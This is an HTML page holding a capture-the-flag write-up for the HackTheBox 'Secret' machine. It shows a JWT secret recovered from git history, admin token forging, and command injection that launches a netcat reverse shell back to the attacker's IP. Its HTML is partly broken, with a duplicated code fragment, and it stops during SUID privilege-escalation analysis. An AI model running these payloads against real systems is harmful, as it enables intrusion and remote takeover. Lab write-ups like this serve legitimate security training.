
<!DOCTYPE html>
<html>

<head>
	<meta charset="UTF-8" />
	<meta http-equiv="X-UA-Compatible" content="IE-edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
	<title>test</title>
	<link rel="stylesheet" href="../../../css/style.css" />
	<style>
		h1 {
			color: #00ff00;
			/* change the color of the main heading */
		}

		h3 {
			color: #ff00ff;
			/* change the color of the subheadings */
		}

		a {
			color: #ffffff;
			/* change the color of the links */
			text-decoration: none;
			/* remove underlines from links */
		}
	</style>
</head>
<body>
	<header class="writeups">
		<h1 class="neon textHeading">Writeups - Notes - CTF's</h1>
			<h3 class="links2-custom">
				·
				<a href="https://twitter.com/AnonHack3r" class="custom-link2">Twitter</a>
				·
				<a href="https://www.youtube.com/@AnonHack3r_1337" class="custom-link2">YouTube</a>
				·
				<a href="https://app.hackthebox.com/profile/480696" class="custom-link2">AnonHack3r</a>
				·
			</h3>
	</header>
    		<div class="badge">
			<!-- BADGES -->
			<p>
				<img src="https://img.shields.io/github/last-commit/AnonHack3r1337/CTF?color=red&style=flat-square">
				<!-- BADGES -->
			</p>
		</div>
    <div class="container">
        <div class="terminal-box">
            <div class="terminal-body">
                <div style="text-align: center;"></div>
                <img src="../../../example.svg" class="example-svg">
                <div class="space">
                    <p></p>
                </div>
                <div style="display: flex; flex-direction: column; align-items: center;">
                    <p class="command-text"><br>For a list of the commands, type<br>
                        <span class="help-txt">"help"</span>
                    </p>
                    <div
                        <div class="cursor">
                            <input id="text" class="txt-input" placeholder="Type something..." autocapitalize="off"
                                autocorrect="off" inputmode="text">
                            <p></p>
                            <i></i>
                        </div>
                    </div>
                </div>
                <div class="content"></div>
            </div>
        </div>
    </div>
	
	<main class="topics-container">
		<div >
			<p>
				<h1 class="custom-heading neon" data-value="HackTheBox Writeups">HackTheBox Writeups</h1>
			</p>
		</div>
        

		<div class="writeupNotes">
            <p><img src="PWND/Secret.png" alt="image"></p>

            <p>Secret [HTB]</p>
            <p>Enumeration</p>
			<h1 id="nmap">Nmap</h1>
            <p>nmap -vvv -p 22,80,3000 -A -v -sC -sV -oN intial.nmap 10.10.11.120 </p>
<div style="text-align: left; font-size: medium;">
<p>
    <p>Nmap scan report for secret.htb (10.10.11.120)
        Host is up, received syn-ack (0.23s latency).
        Scanned at 2021-10-31 00:15:31 EDT for 21s</p>
        <p>PORT     STATE SERVICE REASON  VERSION<br><br>
        22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>
        | ssh-hostkey: <br>
        |   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)<br>
        | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=<br>
        |   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)<br>
        | ecdsa-sha2-nistp256 <br>AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=<br>
        |   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)<br>
        |<em>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci<br><br>
        80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)<br>
        | http-methods: <br>
        |</em>  Supported Methods: GET HEAD POST OPTIONS<br>
        |_http-server-header: nginx/1.18.0 (Ubuntu)<br>
        |<em>http-title: DUMB Docs<br>
        3000/tcp open  http    syn-ack Node.js (Express middleware)<br>
        | http-methods: <br>
        |</em>  Supported Methods: GET HEAD POST OPTIONS
        |_http-title: DUMB Docs<br><br>
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
        <p>Read data files from: /usr/bin/../share/nmap
        Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p><br><br>
        <p>Open Ports</p>
        <p>| Ports | Service | Takeaways |<br>
        | 22 | SSH | OpenSSH 8.2p1 |<br>
        | 80 | HTTP | nginx 1.18.0 |<br>
        | 3000 | HTTP | Node.js |</p>
        <p>
</p>
</div>




</p>

<p>Manual Enumeration<br><br>
    
Just Visting websites on ports 80,3000 both looked same. Just gazing through website 2 features looks intresting.</p>
<p>traversing
it just redirets to /api endpoint
Nothing intresting for now so let&#39;s move on to the seond feature.</p>
<p>Source Code
The website seeming gives out it source code on website just like any other opensource projects. So let&#39;s download it and inspects for something good. Looking at the directory listing of source code it looks like it a git repository. It was all confirmed by ohmyzsh in my case.
<div style="text-align: left; font-size: medium;">
    <p>
        ➜  local-web git:(master) ls -al<br><br>
total 116<br>
drwxr-xr-x   8 kali kali  4096 Sep  3 01:57 .<br>
drwxr-xr-x   3 kali kali  4096 Oct 31 00:28 ..<br>
-rw-r--r--   1 kali kali    72 Sep  3 01:59 .env<br>
drwxr-xr-x   8 kali kali  4096 Sep  8 14:33 .git<br>
-rw-r--r--   1 kali kali   885 Sep  3 01:56 index.js<br>
drwxr-xr-x   2 kali kali  4096 Aug 13 00:42 model<br>
drwxr-xr-x 201 kali kali  4096 Aug 13 00:42 node_modules<br>
-rw-r--r--   1 kali kali   491 Aug 13 00:42 package.json<br>
-rw-r--r--   1 kali kali 69452 Aug 13 00:42 package-lock.json<br>
drwxr-xr-x   4 kali kali  4096 Sep  3 01:54 public<br>
drwxr-xr-x   2 kali kali  4096 Sep  3 02:32 routes<br>
drwxr-xr-x   4 kali kali  4096 Aug 13 00:42 src<br>
-rw-r--r--   1 kali kali   651 Aug 13 00:42 validations.js</p>
    </p>
    </div>

<p>I used git extractor tools to extract everything from the git archives. Link to the GitTools I Used <a href="https://github.com/internetwache/GitTools">https://github.com/internetwache/GitTools</a></p>
<p>mkdir dump
/opt/Git/GitTools/Extractor/extractor.sh local-web/ dump</p>
<p>and it will take time as it is a big repository so give it some time to complete.
so let&#39;s check /routes/auth.js we can see there is the /register endpoint to register user so let&#39;s  confirm this by sending a post request as get requests are not allowed.</p>
<p>➜  local-web git:(master) curl -X POST -H &#39;Content-Type: application/json&#39; -v <a href="http://secret.htb/api/user/register">http://secret.htb/api/user/register</a> --data &#39;{&quot;foo&quot;: &quot;bar&quot;}&#39;
Note: Unnecessary use of -X or --request, POST is already inferred.</p>
Trying 10.10.11.120:80...
Connected to secret.htb (10.10.11.120) port 80 (#0)
<p>POST /api/user/register HTTP/1.1
Host: secret.htb
User-Agent: curl/7.74.0
Accept: <em>/</em>
Content-Type: application/json
Content-Length: 14</p>
</blockquote>
</li>
<li>upload completely sent off: 14 out of 14 bytes</li>
<li>Mark bundle as not supporting multiuse
&lt; HTTP/1.1 400 Bad Request
&lt; Server: nginx/1.18.0 (Ubuntu)
&lt; Date: Sun, 31 Oct 2021 05:20:49 GMT
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 18
&lt; Connection: keep-alive
&lt; X-Powered-By: Express
&lt; ETag: W/&quot;12-FCVaNPnXYf0hIGYsTUTYByRq5/U&quot;
&lt; </li>
<li>Connection #0 to host secret.htb left intact
&quot;name&quot; is required</li>
</ul>
<p>looks like we have a  valid endpoint so let&#39;s see what data it is expecting us to send in order to register a user. Looks like it expects us to give name,email,password in order to register the user. Looks like this schema is also defined in validation.js</p>
<p>const Joi = require(&#39;@hapi/joi&#39;)</p>
<p>// register validation </p>
<p>const registerValidation = data =&gt;{
    const schema = {
        name: Joi.string().min(6).required(),
        email: Joi.string().min(6).required().email(),
        password: Joi.string().min(6).required()
    };</p>
<pre><code>return Joi.validate(data, schema)
</code></pre>
<p>}</p>
<p>// login validation</p>
<p>const loginValidation = data =&gt; {
    const schema2 = {
        email: Joi.string().min(6).required().email(),
        password: Joi.string().min(6).required()
    };</p>
<pre><code>return Joi.validate(data, schema2)
</code></pre>
<p>}</p>
<p>module.exports.registerValidation = registerValidation
module.exports.loginValidation = loginValidation</p>
<p>so now we know that what we know how we can register and login as a user. And we can see that login endpoint creates a JWT token upon loggin in.</p>
<pre><code>const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
res.header(&#39;auth-token&#39;, token).send(token);
</code></pre>
<p>and now we know the location where secret is stored so we can just see it.</p>
<p>➜  local-web git:(master) cat .env
DB_CONNECT = &#39;mongodb://127.0.0.1:27017/auth-web&#39;
TOKEN_SECRET = secret</p>
<p>but no luck I guess it redacted or used a dummy word but it can we in the previous commits so let&#39;s check in that dump folder.</p>
<p>Git Dump Enumeration
Now we have extracted everything from Git repo we can see there is a total of 6 commit.
<div style="text-align: left; font-size: medium;">
    <p>
        ➜  dump ls -al<br>
        total 32<br><br>
        drwxr-xr-x 8 kali kali 4096 Oct 31 00:53 .<br>
        drwxr-xr-x 4 kali kali 4096 Oct 31 00:30 ..<br>
        drwxr-xr-x 7 kali kali 4096 Oct 31 00:35 <br>0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb<br>
        drwxr-xr-x 7 kali kali 4096 Oct 31 00:39 <br>1-55fe756a29268f9b4e786ae468952ca4a8df1bd8<br>
        drwxr-xr-x 7 kali kali 4096 Oct 31 00:43 <br>2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b<br>
        drwxr-xr-x 7 kali kali 4096 Oct 31 00:47 <br>3-de0a46b5107a2f4d26e348303e76d85ae4870934<br>
        drwxr-xr-x 7 kali kali 4096 Oct 31 00:53 <br>4-3a367e735ee76569664bf7754eaaade7c735d702<br>
        drwxr-xr-x 7 kali kali 4096 Oct 31 00:57 <br>5-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78</p>
    </p>
</div>


<p>one thing that we know from above manual enumeration is that it used secret to sign JWT tokens so let&#39;s hunt for it. Looking through all the commit I found token in first 2 commits.
➜  dump cat 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/.env
DB_CONNECT = &#39;mongodb://127.0.0.1:27017/auth-web&#39;
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE</p>
<p>➜  dump cat 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8/.env
DB_CONNECT = &#39;mongodb://127.0.0.1:27017/auth-web&#39;
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE</p>
<p>So now we have the secret let&#39;s go into details of how the token is signed. you can check that on: </p>
<p>/routes/verifytoken.js</p>
<p>const jwt = require(&quot;jsonwebtoken&quot;);</p>
<p>module.exports = function (req, res, next) {
    const token = req.header(&quot;auth-token&quot;);
    if (!token) return res.status(401).send(&quot;Access Denied&quot;);</p>
<pre><code>try {
    const verified = jwt.verify(token, process.env.TOKEN_SECRET);
    req.user = verified;
    next();
} catch (err) {
    res.status(400).send(&quot;Invalid Token&quot;);
}
</code></pre>
<p>};</p>
<p>let&#39;s just create a sample token using the secret found.</p>
<p>Registering User
So let&#39;s register the user from our above knowledge.</p>
<p>➜  local-web git:(master) curl -X POST -H &#39;Content-Type: application/json&#39; -v <a href="http://secret.htb/api/user/register">http://secret.htb/api/user/register</a> --data &#39;{&quot;name&quot;: &quot;oopsie&quot;,&quot;email&quot;: &quot;<a href="mailto:&#111;&#x6f;&#112;&#115;&#x69;&#101;&#64;&#x6f;&#x6f;&#112;&#115;&#x2e;&#x63;&#111;&#109;">&#111;&#x6f;&#112;&#115;&#x69;&#101;&#64;&#x6f;&#x6f;&#112;&#115;&#x2e;&#x63;&#111;&#109;</a>&quot;,&quot;password&quot;: &quot;oopsie&quot;}&#39;</p>
<p>Note: Unnecessary use of -X or --request, POST is already inferred.</p>

<li>  Trying 10.10.11.120:80...</li>
<li>Connected to secret.htb (10.10.11.120) port 80 (#0)<blockquote>
<p>POST /api/user/register HTTP/1.1
Host: secret.htb
User-Agent: curl/7.74.0
Accept: <em>/</em>
Content-Type: application/json
Content-Length: 66</p>
</blockquote>
</li>
<li>upload completely sent off: 66 out of 66 bytes</li>
<li>Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Server: nginx/1.18.0 (Ubuntu)
&lt; Date: Sun, 31 Oct 2021 05:22:38 GMT
&lt; Content-Type: application/json; charset=utf-8
&lt; Content-Length: 17
&lt; Connection: keep-alive
&lt; X-Powered-By: Express
&lt; ETag: W/&quot;11-MVKplfg5kMeyW9LR080TwknJb0I&quot;
&lt; </li>
<li>Connection #0 to host secret.htb left intact
{&quot;user&quot;:&quot;oopsie&quot;}</li>

<p>We registered a user oopsie. Now let&#39;s try and login. For login we know we need to send email and password.
(from validation.js)</p>
<p>➜  local-web git:(master) curl -X POST -H &#39;Content-Type: application/json&#39; -v <a href="http://secret.htb/api/user/login">http://secret.htb/api/user/login</a> --data &#39;{&quot;email&quot;: &quot;<a href="mailto:&#111;&#x6f;&#112;&#115;&#105;&#x65;&#x40;&#x6f;&#x6f;&#112;&#115;&#46;&#99;&#x6f;&#x6d;">&#111;&#x6f;&#112;&#115;&#105;&#x65;&#x40;&#x6f;&#x6f;&#112;&#115;&#46;&#99;&#x6f;&#x6d;</a>&quot;,&quot;password&quot;: &quot;oopsie&quot;}&#39;</p>
<p>Note: Unnecessary use of -X or --request, POST is already inferred.</p>
  Trying 10.10.11.120:80...
Connected to secret.htb (10.10.11.120) port 80 (#0)
<p>POST /api/user/login HTTP/1.1
Host: secret.htb
User-Agent: curl/7.74.0
Accept: <em>/</em>
Content-Type: application/json
Content-Length: 49</p>
</blockquote>
</li>
<li>upload completely sent off: 49 out of 49 bytes</li>
<li>Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Server: nginx/1.18.0 (Ubuntu)
&lt; Date: Sun, 31 Oct 2021 05:24:17 GMT
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 205
&lt; Connection: keep-alive
&lt; X-Powered-By: Express
&lt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU
&lt; ETag: W/&quot;cd-8bWdMB+EkctRi8EWpGcQpwBt2Iw&quot;
&lt; </li>
<li>Connection #0 to host secret.htb left intact
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU</li>
</ul>
<p>looks like we are logged in and we have our token. now let&#39;s see if we can do something intresting with but let&#39;s first see how it validates a JWT token.</p>
<p>const jwt = require(&quot;jsonwebtoken&quot;);</p>
<p>module.exports = function (req, res, next) {
    const token = req.header(&quot;auth-token&quot;);
    if (!token) return res.status(401).send(&quot;Access Denied&quot;);</p>
<pre><code>try {
    const verified = jwt.verify(token, process.env.TOKEN_SECRET);
    req.user = verified;
    next();
} catch (err) {
    res.status(400).send(&quot;Invalid Token&quot;);
}
</code></pre>
<p>};</p>
<p>looks like we just have to pass it as header in request with header name auth-token. so let&#39;s confirm it by sending it to /api/priv endpoint which just tells you if you are admin or not.</p>
<p>➜  local-web git:(master) curl <a href="http://secret.htb/api/priv">http://secret.htb/api/priv</a> -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU&#39; 
{&quot;role&quot;:{&quot;role&quot;:&quot;you are normal user&quot;,&quot;desc&quot;:&quot;oopsie&quot;}}</p>
<p>Looks like we are not admin but we have the secret we can forge the token.
so it basically checks that if name == &#39;theadmin&#39; if so then it will give us the admin capabilities.
Let&#39;s decode our token and find how its made.</p>
<p>I will use jwttool for it you can use any tool of your liking you can also use their online website jwt.io which easy and pretty convinient.</p>
<p>website: <a href="https://jwt.io/">https://jwt.io/</a>
tool: <a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
<p>➜  Secret python /opt/Git/jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3Bz
aWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU</p>
<div style="text-align: left; font-size: medium;">
    <p>

         Version 2.2.4                ______|             @ticarpi      </p>
        <p>Original JWT: </p>
        <p>=====================
        Decoded Token Values:
        =====================</p>
        <p>Token header values:
        [+] alg = &quot;HS256&quot;
        [+] typ = &quot;JWT&quot;</p>
        <p>Token payload values:
        [+] _id = &quot;617e281ee67d3e085338a3f6&quot;
        [+] name = &quot;oopsie&quot;
        [+] email = &quot;<a href="mailto:&#x6f;&#x6f;&#112;&#115;&#105;&#101;&#64;&#111;&#x6f;&#x70;&#x73;&#x2e;&#99;&#111;&#x6d;">&#x6f;&#x6f;&#112;&#115;&#105;&#101;&#64;&#111;&#x6f;&#x70;&#x73;&#x2e;&#99;&#111;&#x6d;</a>&quot;
        [+] iat = 1635657857    ==&gt; TIMESTAMP = 2021-10-31 01:24:17 (UTC)</p>
        <hr>
        <p>JWT common timestamps:
        iat = IssuedAt
        exp = Expires
        nbf = NotBefore</p>
        <hr>
        <p>Forging token
        ➜  Secret python /opt/Git/jwt_tool/jwt_tool.py -I -S hs256 -pc &#39;name&#39; -pv &#39;theadmin&#39; -p &#39;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#39; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU</p><br><br>
        <hr>
        <p style="text-align: center;">Tampered Token: </p>
         Version 2.2.4                ______|             @ticarpi      </p>
        <p>Original JWT: </p>
        <p>jwttool_023763b00ef70ff48ed0e3142e2de9a1 - Tampered token - HMAC Signing:
        [+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw</p>
        <p>Now we have the forged token let&#39;s verify it at /api/priv endpoint
        ➜  dump 
        curl <a href="http://secret.htb/api/priv">http://secret.htb/api/priv</a> -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw&#39;
        {&quot;creds&quot;:{&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;theadmin&quot;,&quot;desc&quot;:&quot;welcome back admin&quot;}}</p>
    </p>
</div>




<p>Now we are admin. Now let&#39;s try to look at logs as we can see it in /routes/private.js 
We have to specify the file name as the get parameter with the name file.</p>
<p>➜  dump curl &#39;<a href="http://secret.htb/api/logs?file=/etc/passwd&#39;">http://secret.htb/api/logs?file=/etc/passwd&#39;</a> -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw&#39;
{&quot;killed&quot;:false,&quot;code&quot;:128,&quot;signal&quot;:null,&quot;cmd&quot;:&quot;git log --oneline /etc/passwd&quot;}</p>
<p>Looks like it&#39;s a comand injection.</p>
<p>Exploitation</p>
<p>Command Injection
➜  dump curl &#39;<a href="http://secret.htb/api/logs?file=;id&#39;">http://secret.htb/api/logs?file=;id&#39;</a> -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw&#39;<br><br>
&quot;80bf34c fixed typos 🎉\n0c75212<br> now we can view logs from server <br>😃\nab3e953 <br>Added the codes<br> uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)<br><br>
Yeah so now let&#39;s to get the rev shell.
fire the rev shell using curl via RCE use this payload [Dont forget to URL-Encode the payload before use]<br><br>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc Your-IP PORT &gt;/tmp/f<br><br>
➜  dump curl &#39;<a href="http://secret.htb/api/logs?file=;rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.16.128+1337+%3E%2Ftmp%2Ff%0A%0A&#39;">http://secret.htb/api/logs?file=;rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.16.128+1337+%3E%2Ftmp%2Ff%0A%0A&#39;</a> -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im9vcHNpZUBvb3BzLmNvbSIsImlhdCI6MTYzNTY1Nzg1N30.atZrtL6UzhLQNDANrsNWeiv9wt4dzdYeOLaiGeNahcw&#39;</p>
<p>And boom we have the revshell
➜  Secret nc -nlvp 443
listening on [any] 443 ...
connect to [<YOUR IP>] from (UNKNOWN) [10.10.11.120] 38614
bash: cannot set terminal process group (2131): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)</p>
<p>PrivESC</p>
<p>SUID Binaries
find / -type f -perm -u=s 2&gt;/dev/null
Gives you an intresting file with setuid at /opt/count. looking for the files in opt directory we are given the code for the binary too.
dasith@secret:/opt$ ls
code.c
count
valgrind.log
So let&#39;s go through the code.

<div style="text-align: left; font-size: medium; ">
    <p>
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;dirent.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;linux/limits.h&gt;</p>f((fstat.st_mode & S_IXOTH) ? "x" : "-");
    }
    else
    {
        printf("??????????");
    }
    printf ("\t%s\n", ent->d_name);
}
closedir(dir);

snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
printf("\n%s", summary);

<p>void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;</p>
<pre><code>int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

if((dir = opendir(path)) == NULL)
{
    printf(&quot;\nUnable to open directory.\n&quot;);
    exit(EXIT_FAILURE);
}
while ((ent = readdir(dir)) != NULL)
{
    ++tot;
    strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
    strcat(fullpath, &quot;/&quot;);
    strncat(fullpath, ent-&gt;d_name, strlen(ent-&gt;d_name));
    if (!lstat(fullpath, &amp;fstat))
    {
        if(S_ISDIR(fstat.st_mode))
        {
            printf(&quot;d&quot;);
            ++directories;
        }
        else if(S_ISLNK(fstat.st_mode))
        {
            printf(&quot;l&quot;);
            ++symlinks;
        }
        else if(S_ISREG(fstat.st_mode))
        {
            printf(&quot;-&quot;);
            ++regular_files;
        }
        else printf(&quot;?&quot;);
        printf((fstat.st_mode &amp; S_IRUSR) ? &quot;r&quot; : &quot;-&quot;);
        printf((fstat.st_mode &amp; S_IWUSR) ? &quot;w&quot; : &quot;-&quot;);
        printf((fstat.st_mode &amp; S_IXUSR) ? &quot;x&quot; : &quot;-&quot;);
        printf((fstat.st_mode &amp; S_IRGRP) ? &quot;r&quot; : &quot;-&quot;);
        printf((fstat.st_mode &amp; S_IWGRP) ? &quot;w&quot; : &quot;-&quot;);
        printf((fstat.st_mode &amp; S_IXGRP) ? &quot;x&quot; : &quot;-&quot;);
        printf((fstat.st_mode &amp; S_IROTH) ? &quot;r&quot; : &quot;-&quot;);
        printf((fstat.st_mode &amp; S_IWOTH) ? &quot;w&quot; : &quot;-&quot;);
        printf((fstat.st_mode &amp; S_IXOTH) ? &quot;x&quot; : &quot;-&quot;);
    }
    else
    {
        printf(&quot;??????????&quot;);
    }
    printf (&quot;\t%s\n&quot;, ent-&gt;d_name);
}
closedir(dir);

snprintf(summary, 4096, &quot;Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n&quot;, tot, regular_files, directories, symlinks);
printf(&quot;\n%s&quot;, summary);
</code></pre>
<p>}</p>
<p>void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;</p>
<pre><code>file = fopen(path, &quot;r&quot;);

if (file == NULL)
{
    printf(&quot;\nUnable to open file.\n&quot;);
    printf(&quot;Please check if file exists and you have read privilege.\n&quot;);
    exit(EXIT_FAILURE);
}

characters = words = lines = 0;
while ((ch = fgetc(file)) != EOF)
{
    characters++;
    if (ch == &#39;\n&#39; || ch == &#39;\0&#39;)
        lines++;
    if (ch == &#39; &#39; || ch == &#39;\t&#39; || ch == &#39;\n&#39; || ch == &#39;\0&#39;)
        words++;
}

if (characters &gt; 0)
{
    words++;
    lines++;
}

snprintf(summary, 256, &quot;Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n&quot;, characters, words, lines);
printf(&quot;\n%s&quot;, summary);
</code></pre>
<p>}</p>
<p>int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];</p>
<pre><code>printf(&quot;Enter source file/directory name: &quot;);
scanf(&quot;%99s&quot;, path);
getchar();
stat(path, &amp;path_s);
if(S_ISDIR(path_s.st_mode))
    dircount(path, summary);
else
    filecount(path, summary);

// drop privs to limit file write
setuid(getuid());
// Enable coredump generation
prctl(PR_SET_DUMPABLE, 1);
printf(&quot;Save results a file? [y/N]: &quot;);
res = getchar();
if (res == 121 || res == 89) {
    printf(&quot;Path: &quot;);
    scanf(&quot;%99s&quot;, path);
    FILE *fp = fopen(path, &quot;a&quot;);
    if (fp != NULL) {
        fputs(summary, fp);
        fclose(fp);
    } else {
        printf(&quot;Could not open %s for writing\n&quot;, path);
    }
}

return 0;
</code></pre>

    </p>
</div>

<p>}</p>
